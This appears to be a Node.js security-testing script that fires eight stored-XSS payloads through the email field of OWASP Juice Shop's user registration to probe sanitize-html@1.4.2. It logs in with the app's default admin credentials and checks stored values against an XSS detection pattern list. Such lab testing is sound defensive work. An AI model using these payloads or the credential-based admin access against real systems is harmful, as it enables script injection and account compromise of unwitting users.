#!/usr/bin/env node
/**
 * XSS Bypass Testing Script for OWASP Juice Shop
 * Tests sanitize-html@1.4.2 bypass techniques
 * Target: http://juice-shop:3000
 */

const BASE_URL = 'http://juice-shop:3000';

// Test payloads - email field in POST /api/Users
const TEST_PAYLOADS = [
  {
    id: 1,
    description: 'javascript: scheme in href',
    email: '<a href="javascript:alert(1)">xss1</a>@test1.com',
    password: 'Test1234!'
  },
  {
    id: 2,
    description: 'HTML entity encoded javascript: scheme',
    email: '<a href="&#106;avascript:alert(1)">xss2</a>@test2.com',
    password: 'Test1234!'
  },
  {
    id: 3,
    description: 'data: URI with script tag',
    email: '<a href="data:text/html,<script>alert(1)</script>">xss3</a>@test3.com',
    password: 'Test1234!'
  },
  {
    id: 4,
    description: 'Protocol-relative URL with target=_blank',
    email: '<a href="//evil.com" target="_blank" name="foo">xss4</a>@test4.com',
    password: 'Test1234!'
  },
  {
    id: 5,
    description: 'HTML comment injection with img onerror',
    email: '<div><a href="http://x"><!-- </a><img src=x onerror=alert(5)> -->text</a></div>@test5.com',
    password: 'Test1234!'
  },
  {
    id: 6,
    description: 'script tag inside anchor tag',
    email: '<p><a href="http://x.com">xss6<script>alert(1)</script></a></p>@test6.com',
    password: 'Test1234!'
  },
  {
    id: 7,
    description: 'Null byte before javascript: scheme',
    email: '<a href="\u0000javascript:alert(7)">xss7</a>@test7.com',
    password: 'Test1234!'
  },
  {
    id: 8,
    description: 'Event handler on allowed tag (onmouseover on b)',
    email: '<b onmouseover="alert(8)">xss8</b>@test8.com',
    password: 'Test1234!'
  }
];

// XSS detection patterns
const XSS_PATTERNS = [
  /javascript:/i,
  /data:/i,
  /on\w+\s*=/i,           // event handlers like onmouseover=, onerror=, etc.
  /<script/i,
  /vbscript:/i,
  /expression\s*\(/i,
  /&#\d+;.*alert/i,       // encoded chars leading to alert
  /onerror/i,
  /onload/i,
  /onclick/i,
  /onmouseover/i,
  /src\s*=\s*x/i,         // typical onerror payload src
];

function containsXSSVector(value) {
  return XSS_PATTERNS.some(pattern => pattern.test(value));
}

async function getAdminJWT() {
  console.log('\n[*] Obtaining admin JWT...');
  const response = await fetch(`${BASE_URL}/rest/user/login`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: 'admin@juice-sh.op', password: 'admin123' })
  });

  if (!response.ok) {
    throw new Error(`Admin login failed: ${response.status} ${response.statusText}`);
  }

  const data = await response.json();
  const token = data?.authentication?.token;
  if (!token) {
    throw new Error(`No token in response: ${JSON.stringify(data)}`);
  }
  console.log('[+] Admin JWT obtained successfully');
  return token;
}

async function registerUser(payload) {
  const response = await fetch(`${BASE_URL}/api/Users`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      email: payload.email,
      password: payload.password,
      passwordRepeat: payload.password,
      securityQuestion: { id: 1, question: 'Your eldest sibling\'s middle name?' },
      securityAnswer: 'test'
    })
  });

  const data = await response.json();
  return { status: response.status, data };
}

async function getAllUsers(adminJWT) {
  const response = await fetch(`${BASE_URL}/rest/user/authentication-details/`, {
    method: 'GET',
    headers: {
      'Authorization': `Bearer ${adminJWT}`,
      'Content-Type': 'application/json'
    }
  });

  if (!response.ok) {
    throw new Error(`Failed to get users: ${response.status} ${response.statusText}`);
  }

  const data = await response.json();
  return data?.data || [];
}

function findStoredEmail(users, payloadEmail) {
  // Try to find by searching for the unique identifier part of the email
  // Payloads end with @test1.com, @test2.com, etc.
  const domainMatch = payloadEmail.match(/@test\d+\.com$/);
  if (domainMatch) {
    const domain = domainMatch[0];
    return users.find(u => u.email && u.email.includes(domain.replace('@', '')));
  }
  return null;
}

function analyzeStoredValue(stored, intended) {
  const result = {
    stored,
    intended,
    changed: stored !== intended,
    hasXSSVector: containsXSSVector(stored),
    bypassSucceeded: false,
    details: []
  };

  if (result.hasXSSVector) {
    result.bypassSucceeded = true;
    result.details.push('XSS vector detected in stored value');
  }

  // Check specific bypass indicators
  if (/javascript:/i.test(stored)) {
    result.details.push('javascript: scheme survived');
  }
  if (/data:/i.test(stored)) {
    result.details.push('data: URI survived');
  }
  if (/on\w+\s*=/i.test(stored)) {
    const matches = stored.match(/on\w+\s*=[^>]*/gi);
    result.details.push(`Event handler survived: ${matches?.join(', ')}`);
  }
  if (/<script/i.test(stored)) {
    result.details.push('script tag survived');
  }
  if (/onerror/i.test(stored)) {
    result.details.push('onerror attribute survived');
  }

  // Check if protocol-relative URL survived (less severe but worth noting)
  if (/href=["']\/\//i.test(stored)) {
    result.details.push('Protocol-relative URL survived (open redirect risk)');
  }

  return result;
}

async function runTests() {
  console.log('='.repeat(70));
  console.log('XSS BYPASS TESTING - sanitize-html@1.4.2 vs OWASP Juice Shop');
  console.log('='.repeat(70));
  console.log(`Target: ${BASE_URL}`);
  console.log(`Test date: ${new Date().toISOString()}`);
  console.log(`Total payloads: ${TEST_PAYLOADS.length}`);

  // Step 1: Get admin JWT
  let adminJWT;
  try {
    adminJWT = await getAdminJWT();
  } catch (err) {
    console.error(`[!] FATAL: Cannot obtain admin JWT: ${err.message}`);
    process.exit(1);
  }

  // Step 2: Register test users with XSS payloads
  console.log('\n[*] Registering test users with XSS payloads...');
  const registrationResults = [];

  for (const payload of TEST_PAYLOADS) {
    process.stdout.write(`    [${payload.id}/8] Testing payload ${payload.id} (${payload.description})... `);
    try {
      const result = await registerUser(payload);
      registrationResults.push({ payload, result, error: null });

      if (result.status === 201 || result.status === 200) {
        console.log(`OK (HTTP ${result.status})`);
      } else if (result.status === 400) {
        // Email validation may reject it - still record
        console.log(`REJECTED (HTTP ${result.status}) - ${result.data?.message || 'unknown reason'}`);
      } else {
        console.log(`HTTP ${result.status}`);
      }
    } catch (err) {
      registrationResults.push({ payload, result: null, error: err.message });
      console.log(`ERROR: ${err.message}`);
    }

    // Small delay to avoid overwhelming the server
    await new Promise(r => setTimeout(r, 300));
  }

  // Step 3: Retrieve all users from admin API
  console.log('\n[*] Retrieving stored user data from admin API...');
  let allUsers;
  try {
    allUsers = await getAllUsers(adminJWT);
    console.log(`[+] Retrieved ${allUsers.length} total users`);
  } catch (err) {
    console.error(`[!] FATAL: Cannot retrieve users: ${err.message}`);
    process.exit(1);
  }

  // Step 4: Analyze results
  console.log('\n' + '='.repeat(70));
  console.log('ANALYSIS RESULTS');
  console.log('='.repeat(70));

  let bypassCount = 0;
  let blockedCount = 0;
  let rejectedCount = 0;

  for (const { payload, result, error } of registrationResults) {
    console.log(`\n${'─'.repeat(70)}`);
    console.log(`TEST ${payload.id}: ${payload.description}`);
    console.log(`${'─'.repeat(70)}`);
    console.log(`INTENDED: ${payload.email}`);

    if (error) {
      console.log(`STATUS: ERROR - ${error}`);
      continue;
    }

    if (result.status === 400 || result.status === 422) {
      // Check if it was rejected at the API level (before sanitization even stores it)
      rejectedCount++;
      const msg = result.data?.message || result.data?.errors?.[0]?.message || JSON.stringify(result.data);
      console.log(`STATUS: REJECTED by API (HTTP ${result.status})`);
      console.log(`REASON: ${msg}`);
      console.log(`VERDICT: BLOCKED - rejected before storage`);
      continue;
    }

    // Find stored email
    const storedUser = findStoredEmail(allUsers, payload.email);

    if (!storedUser) {
      console.log(`STATUS: Registered (HTTP ${result.status}) but could not find stored email`);
      // Try to show what was returned during registration
      if (result.data?.data?.email) {
        const storedEmail = result.data.data.email;
        console.log(`STORED (from registration response): ${storedEmail}`);
        const analysis = analyzeStoredValue(storedEmail, payload.email);

        if (analysis.bypassSucceeded) {
          bypassCount++;
          console.log(`VERDICT: BYPASS SUCCEEDED`);
          if (analysis.details.length > 0) {
            console.log(`DETAILS: ${analysis.details.join(', ')}`);
          }
        } else {
          blockedCount++;
          console.log(`VERDICT: BLOCKED - [${storedEmail}]`);
          if (analysis.changed) {
            console.log(`NOTE: Value was sanitized/modified`);
          }
        }
      } else {
        console.log(`VERDICT: UNKNOWN - user not found in admin listing`);
      }
      continue;
    }

    const storedEmail = storedUser.email;
    console.log(`STORED:   ${storedEmail}`);

    const analysis = analyzeStoredValue(storedEmail, payload.email);

    if (analysis.bypassSucceeded) {
      bypassCount++;
      console.log(`\n*** BYPASS SUCCEEDED ***`);
      if (analysis.details.length > 0) {
        console.log(`XSS VECTORS FOUND:`);
        analysis.details.forEach(d => console.log(`  - ${d}`));
      }
      console.log(`VERDICT: BYPASS SUCCEEDED`);
    } else {
      blockedCount++;
      console.log(`\nVERDICT: BLOCKED - [${storedEmail}]`);
      if (analysis.changed) {
        console.log(`NOTE: Input was sanitized (stored value differs from intended)`);
      } else {
        console.log(`NOTE: Stored value matches intended (sanitizer preserved it)`);
      }
      if (analysis.details.length > 0) {
        console.log(`PARTIAL: ${analysis.details.join(', ')}`);
      }
    }
  }

  // Summary
  console.log('\n' + '='.repeat(70));
  console.log('SUMMARY');
  console.log('='.repeat(70));
  console.log(`Total tests:      ${TEST_PAYLOADS.length}`);
  console.log(`Bypass succeeded: ${bypassCount}`);
  console.log(`Blocked:          ${blockedCount}`);
  console.log(`Rejected by API:  ${rejectedCount}`);
  console.log(`Other/Error:      ${TEST_PAYLOADS.length - bypassCount - blockedCount - rejectedCount}`);

  if (bypassCount > 0) {
    console.log(`\n[!] WARNING: ${bypassCount} XSS vector(s) survived sanitization!`);
    console.log('[!] These could be exploited via Angular innerHTML rendering with bypassSecurityTrustHtml()');
  } else {
    console.log('\n[+] All tested payloads were blocked by sanitize-html@1.4.2');
  }

  // Also dump all stored emails that match our test domains for raw inspection
  console.log('\n' + '='.repeat(70));
  console.log('RAW STORED EMAIL VALUES (from admin API)');
  console.log('='.repeat(70));
  const testDomains = ['test1.com', 'test2.com', 'test3.com', 'test4.com', 'test5.com', 'test6.com', 'test7.com', 'test8.com'];
  const testUsers = allUsers.filter(u => u.email && testDomains.some(d => u.email.includes(d)));

  if (testUsers.length === 0) {
    console.log('No test users found in admin listing (they may have been rejected or not stored)');
    // Show registration response emails instead
    console.log('\nEmails from registration responses:');
    for (const { payload, result } of registrationResults) {
      if (result?.data?.data?.email) {
        console.log(`  Test ${payload.id}: ${result.data.data.email}`);
      }
    }
  } else {
    testUsers.forEach(u => {
      const hasXSS = containsXSSVector(u.email);
      console.log(`  [${hasXSS ? '!XSS!' : 'clean'}] id=${u.id} email=${u.email}`);
    });
  }

  console.log('\n[*] Test complete.');
}

// Run the tests
runTests().catch(err => {
  console.error(`\n[!] Unhandled error: ${err.message}`);
  console.error(err.stack);
  process.exit(1);
});
